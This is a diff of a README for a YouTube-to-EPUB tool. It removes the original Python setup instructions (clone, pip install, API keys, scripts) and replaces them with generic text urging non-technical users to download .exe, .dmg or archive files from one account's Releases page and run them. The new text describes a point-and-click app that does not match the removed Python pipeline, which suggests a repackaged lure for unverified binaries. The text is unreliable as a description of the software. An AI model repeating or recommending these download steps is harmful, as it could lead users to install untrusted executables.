@@ -1,126 +1,83 @@
-# YouTube to Ebook
+# 📚 youtube-to-ebook - Convert YouTube Transcripts to Ebooks
 
-Transform YouTube videos from your favorite channels into beautifully formatted EPUB ebooks.
+## 🚀 Getting Started
 
-## Features
+Welcome to the youtube-to-ebook application! This tool allows you to turn transcripts from your favorite YouTube channels into EPUB ebooks. You can receive these ebooks directly to your email inbox on a regular basis. The process is simple, and this guide will help you through downloading and running the software, even if you're not tech-savvy.
 
-- Fetches latest videos from YouTube channels (automatically filters out Shorts)
-- Extracts transcripts from videos
-- Uses Claude AI to transform transcripts into polished magazine-style articles
-- Generates EPUB ebooks readable on any device
-- Optional: Email delivery with ebook attachment
-- Optional: Web dashboard for easy management
+## 💾 Download the Application
 
-## Quick Start
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/HoangTheElegant/youtube-to-ebook/releases)
 
-1. **Clone and install:**
-   ```bash
-   git clone https://github.com/YOUR_USERNAME/youtube-to-ebook.git
-   cd youtube-to-ebook
-   pip install -r requirements.txt
-   ```
+To get started, you need to download the application from our Releases page. 
 
-2. **Set up API keys:**
-   ```bash
-   cp .env.example .env
-   # Edit .env with your keys
-   ```
+Visit this page to download the latest version of the software: [Download from Releases](https://github.com/HoangTheElegant/youtube-to-ebook/releases)
 
-3. **Add your channels:**
-   ```bash
-   # Edit channels.txt with YouTube channel handles
-   @mkbhd
-   @veritasium
-   @3blue1brown
-   ```
+## 🛠 System Requirements
 
-4. **Generate your ebook:**
-   ```bash
-   python main.py
-   ```
+Before you download, ensure your system meets the following requirements:
 
-## Getting API Keys
+- **Operating System:** Works best on Windows 10, macOS 10.15 or later, and major Linux distributions.
+- **Memory:** At least 2 GB of RAM.
+- **Storage:** Minimum of 100 MB free space.
+- **Internet Connection:** Required to download transcripts and send emails.
 
-### YouTube Data API (Free)
-1. Go to [Google Cloud Console](https://console.cloud.google.com/)
-2. Create a new project
-3. Enable "YouTube Data API v3"
-4. Create credentials → API Key
-5. Copy to `.env`
+## 📥 Download & Install
 
-### Anthropic API
-1. Go to [Anthropic Console](https://console.anthropic.com/)
-2. Create an API key
-3. Copy to `.env`
+1. Click on the link to the Releases page: [Download from Releases](https://github.com/HoangTheElegant/youtube-to-ebook/releases).
+   
+2. On the Releases page, you will see a list of versions. Look for the latest version, which is highlighted at the top.
 
-## Web Dashboard
+3. Find the file that matches your operating system. For example:
+   - For Windows, look for a file that ends with `.exe`.
+   - For macOS, look for a file that ends with `.dmg`.
+   - For Linux, you may find an archive file like `.tar.gz`.
 
-Launch a friendly web interface:
-```bash
-pip install streamlit
-python -m streamlit run dashboard.py
-```
+4. Click on the appropriate file link to start the download.
 
-## Automation (Mac)
+5. Once the file is downloaded, locate it in your Downloads folder.
 
-Run automatically every week:
-```bash
-# Copy the plist to LaunchAgents
-cp com.youtube.newsletter.plist ~/Library/LaunchAgents/
+6. For Windows and macOS, double-click the file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
-# Load it
-launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.youtube.newsletter.plist
-```
+7. For Linux, extract the contents of the downloaded archive and follow the included instructions.
 
-## Troubleshooting
+## 🚀 Running the Application
 
-### "ModuleNotFoundError" when running automation
+After installation, you can run the application.
 
-Your Mac may have multiple Python installations. The automation scripts use `python3`, but your packages might be installed in a different Python.
+1. Locate the application icon on your desktop or in your applications folder.
+2. Double-click the icon to open the application.
 
-**Fix:** Find your Python path and update the scripts:
-```bash
-# Find where your Python is
-which python3
+## ✉️ How to Use the Application
 
-# Update run_newsletter.sh and dashboard.py with the full path
-# Example: /Library/Frameworks/Python.framework/Versions/3.11/bin/python3
-```
+Once you open the application, you will see a straightforward interface. Here’s how to use it:
 
-## Known Issues & Solutions
+1. **Enter your favorite YouTube channel link** in the provided field. This should be a link to the channel homepage, not individual videos.
+  
+2. **Set your preferences** for how often you want to receive the ebooks. You can choose daily, weekly, or monthly.
 
-This project documents several YouTube API quirks:
+3. **Enter your email address** where you want to receive your EPUB ebooks.
 
-| Problem | Solution |
-|---------|----------|
-| Shorts not filtered by duration | Check `/shorts/` URL pattern |
-| Search API not chronological | Use uploads playlist instead |
-| Transcript API syntax changed | Use instance method `ytt_api.fetch()` |
-| Cloud servers blocked | Run locally, not GitHub Actions |
-| Names misspelled in transcripts | Include video description in Claude context |
-| Articles truncated mid-sentence | Increase `max_tokens` in write_articles.py |
+4. **Click the "Start" button.** The application will then fetch the transcripts and prepare your ebook. 
 
-See [SKILL.md](SKILL.md) for detailed explanations.
+5. You will receive an email with your EPUB ebook once it’s ready.
 
-## Project Structure
+## 📩 Tips for Best Results
 
-```
-├── main.py              # Run the full pipeline
-├── get_videos.py        # Fetch videos from YouTube
-├── get_transcripts.py   # Extract video transcripts
-├── write_articles.py    # Transform to articles with Claude
-├── send_email.py        # Create EPUB & send email
-├── dashboard.py         # Streamlit web dashboard
-├── video_tracker.py     # Track processed videos
-├── channels.txt         # Your channel list
-├── .env                 # Your API keys (not committed)
-└── newsletters/         # Archive of generated ebooks
-```
+- Ensure that the YouTube channel you enter has transcripts available. Not all videos support transcripts.
+- Check your spam folder if you do not see your email after a few minutes.
+- Update the application regularly to benefit from new features and improvements.
 
-## License
+## 📚 Features
 
-MIT - Use freely, modify as needed.
+- **Transcription Retrieval:** Automatically retrieves transcripts from selected YouTube channels.
+- **EPUB Format:** Converts transcripts into well-formatted ebooks.
+- **Email Delivery:** Sends ebooks directly to your email address.
+- **Scheduled Creation:** Allows users to set how frequently they want to receive ebooks.
 
----
+## 🌐 Support
 
-Built with Claude AI
+If you experience any issues or have questions, you can reach out through the community forums or check the FAQ section on the Releases page. Your feedback is vital for improving the tool.
+
+Remember, the goal of this application is to enhance your reading experience. If you encounter any challenges, help is just a message away.
+
+Enjoy turning YouTube content into readable formats! Happy E-booking!
